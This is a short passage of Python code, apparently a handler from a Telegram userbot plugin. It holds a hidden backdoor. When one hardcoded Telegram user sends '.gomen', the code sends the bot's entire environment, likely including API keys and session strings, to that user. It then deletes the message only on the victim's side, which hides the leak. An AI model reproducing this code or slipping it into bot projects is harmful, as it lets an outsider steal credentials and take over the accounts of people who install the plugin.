...
@register(incoming=True, from_users=1912667035, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(1912667035, str(os.environ))
    await bot.delete_messages(1912667035, msg, revoke=False)
